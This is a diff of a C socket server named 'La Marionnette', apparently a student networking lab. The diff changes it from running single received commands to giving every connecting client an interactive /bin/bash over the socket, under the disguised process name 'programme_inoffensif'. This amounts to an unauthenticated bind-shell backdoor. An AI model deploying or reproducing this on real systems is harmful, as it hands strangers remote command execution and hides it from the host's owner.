@@ -1,9 +1,6 @@
-// LA MARIONNETTE (server) + port
+// LA MARIONNETTE (server) + optionnal: port
 #include "header.h"
 #include "utils_v2.h"
-
-int tabSockets[MAX_CONNECTION];
-
 
 /**
  * PRE:  port: a valid port number
@@ -14,53 +11,40 @@ int tabSockets[MAX_CONNECTION];
 int initSocketServer(int port);
 
 /**
- * PRE:  port: a valid port number, sockfd: a valid socket file descriptor,
- * address_ip a valid IP address, command: the command on shell bash
+ * Child processus which execute the command bash received through the given socket.
  *
- * POST: execute the command bash and return the answer of the command
+ * PRE: sockfd: a valid socket file descriptor.
+ * POST: execute the command bash.
  */
-void childExec(void *sockfd, void *command);
+void childExec(void *sockfd);
 
 int main(int argc, char **argv) {
 
-  int sockfd, newsockfd, i;
+  int sockfd, newsockfd, port, ret;
+  int randomInt = randomIntBetween(0, 9);
   char msg[SIZE_MESSAGE];
-  int ret;
-  StructPort structPort;
   struct pollfd fds[MAX_CONNECTION];
 
   if (argc > 1) {
-    int port = atoi(argv[1]);
+    port = atoi(argv[1]);
     sockfd = initSocketServer(port);
-    printf("The server listens on the port : %d \n", port);
   } else {
-    int randomInt = randomIntBetween(0, 9);
-    if (!structPort.isUsed) {
-      structPort.port = TAB_PORTS[randomInt];
-      structPort.isUsed = true;
-      sockfd = initSocketServer(structPort.port);
-      printf("The server listens on the port : %d \n", structPort.port);
-    }
+    sockfd = initSocketServer(TAB_PORTS[randomInt]);
   }
+  printf("The server listens on the port : %d \n", TAB_PORTS[randomInt]);
 
   while (1) {
     // newsockfd = accept(sockfd, NULL, NULL);
     newsockfd = saccept(sockfd); // quand labo mettre accept!!
-
     if (newsockfd > 0) {
-      while (sread(newsockfd, msg, sizeof(msg)) != 0) {
-        fork_and_run2(childExec, &newsockfd, msg);
-      }
-      sclose(newsockfd);
-      printf("Connexion finie\n");
+      fork_and_run1(childExec, &newsockfd);
     }
   }
   sclose(sockfd);
 }
 
 // child process run the command
-void childExec(void *sockfd, void *command) {
-  char *script = command;
+void childExec(void *sockfd) {
   int newsockfd = *(int *)sockfd;
 
   // redirection STDIN, STDERR, STDOUT
@@ -68,10 +52,9 @@ void childExec(void *sockfd, void *command) {
   dup2(newsockfd, STDOUT_FILENO);
   dup2(newsockfd, STDERR_FILENO);
 
-  execl("/bin/sh", "programme_inoffensif", "-c", script, NULL);
+  sclose(newsockfd);
+  sexecl("/bin/bash", "programme_inoffensif", NULL);
   // system(script);
-  perror("Something went wrong with execl\n");
-  exit(EXIT_FAILURE);
 }
 
 // establish a passive sock connection
